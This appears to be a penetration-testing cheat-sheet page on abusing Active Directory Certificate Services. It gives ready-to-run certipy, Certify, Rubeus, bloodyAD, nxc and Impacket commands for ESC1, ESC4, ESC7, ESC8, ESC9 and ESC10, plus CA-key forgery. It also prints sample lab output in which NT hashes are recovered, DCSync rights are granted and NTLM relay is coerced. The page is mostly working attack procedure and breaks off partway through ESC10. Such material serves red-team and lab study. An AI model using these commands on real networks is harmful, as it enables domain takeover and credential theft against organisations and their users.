---
title: "ADCS"
tags: ["Kerberos", "Pass-The-Ticket", "Certify", "Credential Dumping", "LDAP", "Pass-The-Hash", "Ticket Granting Ticket", "Domain Controller", "Certificate Services", "Active Directory", "Windows", "ADCS", "Pass-The-Cert", "Lookup SID"]
---

### Enum (From Linux)

{{< tab set1 tab1 >}}certipy-ad{{< /tab >}}
{{< tab set1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Password
certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable
```

```console
# NTLM
certipy-ad find -u '<USER>' -hashes '<HASH>' -target <TARGET> -text -stdout -vulnerable
```

```console
# Kerberos
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -text -stdout -vulnerable -dc-host <DC> -ns <DC_IP>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Password
nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M adcs
```

```console
# NTLM
nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -M adcs
```

{{< /tabcontent >}}

### Enum (From Windows)

{{< tab set2 tab1 >}}Powershell{{< /tab >}}
{{< tab set2 tab2 >}}Certify{{< /tab >}}
{{< tab set2 tab3 >}}ADCSTemplate{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
# Check ADCS service
net start | findstr /i cert
```

```console
# Check env
certutil
```

```console
# List cert templates
certutil -catemplates
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
# Get info of each template
.\Certify.exe enum-cas
```

```console
# Find vuln templates
.\Certify.exe enum-cas --filter-vulnerable --current-user
```

{{< /tabcontent >}}
{{< tabcontent set2 tab3 >}}

```console
# Import ADCSTemplate module
import-module .\ADCSTemplate.psm1
```

```console
# List templates
get-adcstemplate | fl displayname
```

<small>*Ref: [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)*</small>

{{< /tabcontent >}}

---

### Request a Personal Information Exchange File (.pfx)

{{< tab set3 tab1 >}}Linux{{< /tab >}}
{{< tab set3 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Request a pfx

```console
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca <CA> -template User -target <DC> -pfx '<USER>.pfx'
```

```console {class="sample-code"}
$ certipy-ad req -u 'oorend@rebound.htb' -p '1GR8t@$$4u' -ca rebound-DC01-CA -template User -target dc01.rebound.htb -pfx oorend.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'oorend@rebound.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-7682'
[*] Saved certificate and private key to 'oorend.pfx'
```

#### 2. Get NTLM Hash with pfx

```console
sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx '<USER>.pfx' -domain <DOMAIN> -dc-ip <DC_IP>
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

#### 1. Request a Certificate

```console
.\Certify.exe request /ca:<CA> /template:User
```

#### 2. Convert pem to pfx

```console
# Copy -----BEGIN RSA PRIVATE KEY----- ---[SNIP]--- -----END CERTIFICATE----- to cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx
```

#### 3. Get NTLM Hash with pfx

```console
.\rubeus.exe asktgt /user:'<USER>' /certificate:cert.pfx /getcredentials /show /nowrap
```

{{< /tabcontent >}}

---

### Administrator of CA

{{< tab set18 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set18 tab1 >}}

#### 1. Backup CA Certificate and Private Key

```console
# Password
certipy-ad ca -u '<USER>' -p '<PASSWORD>' -target <TARGET_DOMAIN> -backup
```

```console {class="sample-code"}
certipy-ad ca -u 'cert_admin' -p 'P@ssw0rd123' -target MS01.example.com -backup
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: MS01.example.com.
[!] Use -debug to print a stacktrace
[*] Creating new service for backup operation
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Backing up original PFX/P12 to 'pfx.p12'
[*] Backed up original PFX/P12 to 'pfx.p12'
[*] Saving certificate and private key to 'CA.pfx'
[*] Wrote certificate and private key to 'CA.pfx'
[*] Cleaning up
```

#### 2. Forge a Certificate

```console
certipy-ad forge -ca-pfx CA.pfx -upn administrator@<DOMAIN> -subject 'CN=Administrator,CN=Users,DC=<EXAMPLE>,DC=<COM>'
```

```console {class="sample-code"}
$ certipy-ad forge -ca-pfx CA.pfx -upn administrator@example.com -subject 'CN=Administrator,CN=Users,DC=EXAMPLE,DC=COM'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
```

#### 3. Export '.crt' and '.key' from '.pfx'

```console
# Export crt
certipy-ad cert -pfx 'administrator_forged.pfx' -nokey -out 'administrator_forged.crt'
```

```console
# Export key
certipy-ad cert -pfx 'administrator_forged.pfx' -nocert -out 'administrator_forged.key'
```

#### 4. Pass-the-Cert

```console
python3 passthecert.py -action modify_user -crt administrator_forged.crt -key administrator_forged.key -target <TARGET_USER> -elevate -domain <DOMAIN> -dc-host <DC>
```

```console {class="sample-code"}
$ python3 passthecert.py -action modify_user -crt administrator_forged.crt -key administrator_forged.key -target apple.seed -elevate -domain example.com -dc-host dc01.example.com
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Granted user 'apple.seed' DCSYNC rights!
```

#### 5. Secrets Dump

```console
impacket-secretsdump '<TARGET_USER>:<PASSWORD>@<DC>'
```

{{< /tabcontent >}}

---

### ESC1: Enrollee-Supplied Subject for Client Authentication

#### Abuse #1: Add Smartcard Logon

{{< tab set4 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Import Modules

```console
. .\PowerView.ps1
```

```console
. .\ADCS.ps1
```

#### 2. Add Smartcart Logon

```console
Get-SmartCardCertificate -Identity Administrator -TemplateName <VULN_TEMPLATE> -NoSmartCard -Verbose
```

#### 3. Get Cert_Thumbprint

```console
Get-ChildItem cert:\currentuser\my -recurse
```

#### 4. Get NTLM hash

```console
.\rubeus.exe asktgt /user:Administrator /certificate:<THUMBPRINT> /getcredentials /show /nowrap
```

#### 5. Remote

```console
impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
```

<small>*Ref: [PoshADCS](https://github.com/cfalta/PoshADCS)*</small>

{{< /tabcontent >}}

#### Abuse #2: Set Alternative Name

{{< tab set5 tab1 >}}Linux{{< /tab >}}
{{< tab set5 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set5 tab1 >}}

#### 1. Lookup SID

```console
# Password
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

```console
# NTLM
certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'cert_admin@example.com' -hashes 'f87---[SNIP]---773' -target 'dc01.example.com' -dc-ip '10.10.10.10' -user 'administrator' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=example,DC=com
    name                                : Administrator
    objectSid                           : S-1-5-21-1---[SNIP]---7-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2024-11-16T00:01:41+00:00
    whenChanged                         : 2025-07-14T11:03:29+00:00
```

#### 2. Request Certificate for the Target User

```console
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
```

```console
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
```

```console
# Kerberos
certipy-ad req -u '<USER>' -p '<PASSWORD>' -k -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
```

#### 3. Get NTLM Hash

```console
sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx <TARGET_USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

#### 4. Remote

```console
evil-winrm -i <TARGET> -u <TARGET_USER> -H <HASH>
```

{{< /tabcontent >}}
{{< tabcontent set5 tab2 >}}

#### 1. Generate a Cert with Altname

```console
.\Certify.exe request /ca:<CA> /template:<VULN_TEMPLATE> /altname:administrator
```

#### 2. Convert pem to pfx

```console
# Copy -----BEGIN RSA PRIVATE KEY----- ---[SNIP]--- -----END CERTIFICATE----- to cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out administrator.pfx
```

#### 3. Get NTLM Hash

```console
.\rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials /show /nowrap
```

#### 4. Remote

```console
# Remote
impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
```

{{< /tabcontent >}}

#### Abuse #3: Set msPKI-Certificate-Name-Flag

{{< tab set6 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set6 tab1 >}}

#### 1. Import ADCSTemplate Module

```console
import-module .\ADCSTemplate.psm1
```

#### 2. Create Template with msPKI-Certificate-Name-Flag Modified

```console
Export-ADCSTemplate -displayName <VULN_TEMPLATE> > template.json
```

```console
$template = cat template.json -raw | ConvertFrom-Json
```

```console
$template.'msPKI-Certificate-Name-Flag' = 0x1
```

```console
$template | ConvertTo-Json | Set-Content template_mod.json
```

#### 3. Create a New Certificate Template

```console
New-ADCSTemplate -DisplayName 'vuln_esc1' -Publish -JSON (cat template_mod.json -raw)
```

#### 4. Allow the User to Enroll in the Certificate

```console
# Set permissions on the new template to allow a specific user to enroll in the certificate
Set-ADCSTemplateACL -DisplayName 'vuln_esc1' -type allow -identity '<DOMAIN>\<USER>' -enroll
```

#### 5. Request a Cert with Altname

```console
.\Certify.exe request /ca:<CA> /template:vuln_esc1 /altname:administrator
```

#### 6. Get NTLM Hash

```console
.\rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials /show /nowrap
```

#### 7. Remote

```console
impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
```

<small>*Ref: [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)*</small>

{{< /tabcontent >}}

---

### ESC4: Template Hijacking

{{< tab set7 tab1 >}}Linux{{< /tab >}}
{{< tab set7 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set7 tab1 >}}

#### 1. Modify Template to a Vulnerable State

```console
# Password
certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -write-default-configuration -no-save
```

```console
# NTLM
certipy-ad template -u '<USER>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>' -write-default-configuration -no-save
```

```console {class="sample-code"}
$ certipy-ad template -u 'ca_svc@sequel.htb' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -template 'DunderMifflinAuthentication' -write-default-configuration -no-save
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```

#### 2. Request a Certificate Using the Modified Template

```console
# Password
certipy-ad req -username '<USER>' -p '<PASSWORD>' -template '<TEMPLATE>' -target <TARGET> -ca <CA> -upn administrator@<DOMAIN>
```

```console
# NTLM
certipy-ad req -username '<USER>' -hashes '<HASH>' -template '<TEMPLATE>' -target <TARGET> -ca <CA> -upn administrator@<DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad req -username 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -template 'DunderMifflinAuthentication' -target DC01.sequel.htb -ca sequel-DC01-CA -upn administrator@sequel.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.sequel.htb.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### 3. Get NTLM Hash

```console
certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.129.255.195
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

#### 4. Remote

```console
evil-winrm -i <TARGET> -u administrator -H <HASH>
```

{{< /tabcontent >}}
{{< tabcontent set7 tab2 >}}

#### 1. Import Module

```console
. .\PowerView.ps1
```

#### 2. Modify Template to a Vulnerable State

```console
Add-DomainObjectAcl -TargetIdentity <VULN_TEMPLATE> -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=<EXAMPLE>,DC=<COM>"
```

```console
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<EXAMPLE>,DC=<COM>" -Identity <VULN_TEMPLATE> -XOR @{'mspki-certificate-name-flag'=1} -Verbose
```

```console
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<EXAMPLE>,DC=<COM>" -Identity <VULN_TEMPLATE> -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

#### 3. Request a Certificate Using the Modified Template

```console
.\Certify.exe request --ca <DOMAIN>>\<CA> --template <VULN_TEMPLATE> --upn administrator@<DOMAIN>
```

#### 4. Get NTLM Hash

```console
# Convert the base64 encoded cert
echo '<BASE64_CERT>' | base64 -d > administrator.pfx
```

```console
# Request a TGT
.\rubeus.exe asktgt /user:Administrator /certificate:<PFX_FILE> /ptt /nowrap /getcredentials
```

{{< /tabcontent >}}

---

### ESC7: Dangerous Permissions on CA

{{< tab set8 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set8 tab1 >}}

#### 1. Use ManageCA Privilege to Add Manage Certificates Permission

```console
certipy-ad ca -ca <CA> -add-officer '<USER>' -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

```console
# Check
certipy-ad find -dc-ip <DC> -ns <DC_IP> -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -vulnerable -stdout
```

#### 2. Enable SubCA Template \[Optional\]

```console
certipy-ad ca -ca <CA> -enable-template 'SubCA' -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

#### 3. Request a Cert Based on SubCA

```console
# Expect to be failed. Take note of the Request ID
certipy-ad req -ca <CA> -target <TARGET_DOMAIN> -template SubCA -upn administrator@<DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

#### 4. Issue Request Using ManageCA and Manage Certificates Privilege

```console
certipy-ad ca -ca <CA> -issue-request <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

#### 5. Request a Certificate from CA on the Target Domain

```console
certipy-ad req -ca <CA> -target <TARGET_DOMAIN> -retrieve <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

#### 6. Get NTLM Hash

```console
certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

#### 7. Remote

```console
evil-winrm -i <TARGET> -u administrator -H <HASH>
```

{{< /tabcontent >}}

---

### ESC8: NTLM Relay to AD CS Web Enrollment

{{< tab set9 tab1 >}}Linux{{< /tab >}}
{{< tab set9 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set9 tab1 >}}

#### 1. DNS Poisoning

```console
# Password
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

```console
# NTLM
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

```console {class="sample-code"}
$ bloodyAD -u 'apple.seed' -p ':be167---[REDACTED]---68017' -f rc4 -d example.com --host DC01.example.com add dnsRecord 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.149.102
```

#### 2. Setup NTLM Relay

```console
certipy-ad relay -target '<TARGET_URL>' -template DomainController
```

```console {class="sample-code"}
$ certipy-ad relay -target 'http://DC02.example.com/certsrv/certfnsh.asp' -template DomainController
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting http://DC02.example.com/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] SMBD-Thread-2 (process_request_thread): Received connection from 127.0.0.1, attacking target http://DC02.example.com
[*] HTTP Request: GET http://dc02.example.com/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc02.example.com/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc02.example.com/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Authenticating against http://DC02.example.com as EXAMPLE/DC01$ SUCCEED
[*] Requesting certificate for 'EXAMPLE\\DC01$' based on the template 'DomainController'
[*] HTTP Request: POST http://dc02.example.com/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 5
[*] Retrieving certificate for request ID: 5
[*] HTTP Request: GET http://dc02.example.com/certsrv/certnew.cer?ReqID=5 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC01.example.com'
[*] Certificate object SID is 'S-1-5-21-1202327606-3023051327-2528451343-1000'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
[*] Exiting...
```

#### 3. Check Coerce Authentication Methods

```console
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus
```

```console {class="sample-code"}
$ nxc smb DC01.example.com -u 'apple.seed' -H 'be167---[REDACTED]---68017' -d example.com -k -M coerce_plus  
SMB         DC01.example.com 445    DC01        [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:example.com) (signing:True) (SMBv1:False)
SMB         DC01.example.com 445    DC01        [+] example.com\apple.seed:be167---[REDACTED]---68017 
COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, DFSCoerce
COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, PetitPotam
COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, PrinterBug
COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, PrinterBug
COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, MSEven
```

#### 4. Coerce Authentication

```console
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus -o LISTENER=<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=<METHOD>
```

```console {class="sample-code"}
$ nxc smb DC01.example.com -u 'apple.seed' -H 'be167---[REDACTED]---68017' -d example.com -M coerce_plus -o LISTENER=DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         10.10.149.101   445    DC01        [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:example.com) (signing:True) (SMBv1:False) 
SMB         10.10.149.101   445    DC01        [+] example.com\apple.seed:be167---[REDACTED]---68017 
COERCE_PLUS 10.10.149.101   445    DC01        VULNERABLE, PetitPotam
COERCE_PLUS 10.10.149.101   445    DC01        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

#### 5. Get NTLM Hash

```console
certipy-ad auth -pfx <DC_HOSTNAME>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad auth -pfx dc01.pfx -domain example.com -dc-ip 10.10.149.101
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.example.com'
[*]     Security Extension SID: 'S-1-5-21-1202327606-3023051327-2528451343-1000'
[*] Using principal: 'dc01$@example.com'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@example.com': aad3b435b51404eeaad3b435b51404ee:156dd---[REDACTED]---b077c
```

{{< /tabcontent >}}
{{< tabcontent set9 tab2 >}}

#### 1. Setup

```console
+-------------------------------------------------+
| 1. Join Domain                                  |
| 2. Config DNS                                   |
| 3. Config C:\Windows\System32\drivers\etc\hosts |
+-------------------------------------------------+
```

#### 2. Request a Ticket

```console
.\rubeus.exe asktgt /user:'<USER>' /password:'<PASSWORD>' /enctype:AES256 /domain:'<DOMAIN>' /dc:'<DC>' /ptt /nowrap
```

#### 3. Check

```console
klist
```

#### 4. RemoteKrbRelay

```console
.\RemoteKrbRelay.exe -adcs -template DomainController -victim <VICTIM> -target <TARGET> -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3
```

#### 5. Convert Base64 Encoded Cert to p12

```console
cat cert_b64 | base64 -d > cert.p12
```

#### 6. Get NTLM Hash

```console
certipy-ad auth -pfx cert.p12 -domain <DOMAIN> -dc-ip <DC_IP>
```

<small>*Ref: [RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay)*</small>

{{< /tabcontent >}}

---

### ESC9: No Security Extension on Certificate Template

{{< tab set10 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set10 tab1 >}}

#### 1. Modify Target User's userPrincipalName (With GenericAll/GenericWrite)

```console
# Password
certipy-ad account update -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -user <TARGET_USER> -upn Administrator
```

```console
# NTLM
certipy-ad account update -username '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn Administrator
```

```console {class="sample-code"}
$ certipy-ad account update -username 'management_svc@CERTIFIED.HTB' -hashes a091c1832bcdd4677c28b5a6a1295584 -user CA_OPERATOR -upn Administrator     
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

#### 2. Request a Cert of Target User

```console
# Password
certipy-ad req -username '<TARGET_USER>@<DOMAIN>' -password '<PASSWORD>' -ca <CA> -template <VULN_TEMPLATE>
```

```console
# NTLM
certipy-ad req -username '<TARGET_USER>@<DOMAIN>' -hashes <HASH> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -username 'CA_OPERATOR@CERTIFIED.HTB' -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### 3. Change Back Target User's userPrincipalName

```console
# Password
certipy-ad account update -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -user <TARGET_USER> -upn '<TARGET_USER>@<DOMAIN>'
```

```console
# NTLM
certipy-ad account update -username '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn '<TARGET_USER>@<DOMAIN>'
```

```console {class="sample-code"}
$ certipy-ad account update -username 'management_svc@CERTIFIED.HTB' -hashes a091c1832bcdd4677c28b5a6a1295584 -user CA_OPERATOR -upn 'CA_OPERATOR@CERTIFIED.HTB'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_operator':
    userPrincipalName                   : CA_OPERATOR@CERTIFIED.HTB
[*] Successfully updated 'ca_operator'
```

#### 4. Get NTLM Hash

```console
certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

#### 5. Remote

```console
evil-winrm -i <TARGET> -u administrator -H <HASH>
```

{{< /tabcontent >}}

---

### ESC10: Weak Certificate Mapping for Schannel Authentication

{{< tab set11 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set11 tab1 >}}

#### 1. Request a TGT

```console
# Password
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console
# NTLM
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>' -hashes ':<HASH>' -dc-ip <DC_IP>
```

```console
export KRB5CCNAME='<USER>.ccache'
```

#### 2. Check

```console
# Look for WRITE on altSecurityIdentities
bloodyAD -d <DOMAIN> -k --host <DC> get writable --detail
```

```console {class="sample-code"}
altSecurityIdentities: WRITE
```

```console
# Look for CertificateMappingMethods = 0x4
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\'

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
    EventLogging    REG_DWORD    0x1
    CertificateMappingMethods    REG_DWORD    0x4
```

```console
# Look for Target User UPN
certipy-ad account -k -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

#### 2. Modify Target User's userPrincipalName

```console
# Kerberos
certipy-ad account -k -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' -upn '<DC_HOSTNAME>$@<DOMAIN>' update
```

#### 2. Request a Cert of Target User

```console
# Password
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<TARGET_USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console
# NTLM
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<TARGET_USER>' -hashes ':<HASH>' -dc-ip <DC_IP>
```

```console
export KRB5CCNAME='<TARGET_USER>.ccache'
```

```console
certipy-ad req -k -target '<DC>' -dc-ip '<DC_IP>' -ca '<CA>' -template 'User'
```

#### 3. Change Back Target User's userPrincipalName

```console
export KRB5CCNAME='<USER>.ccache'
```

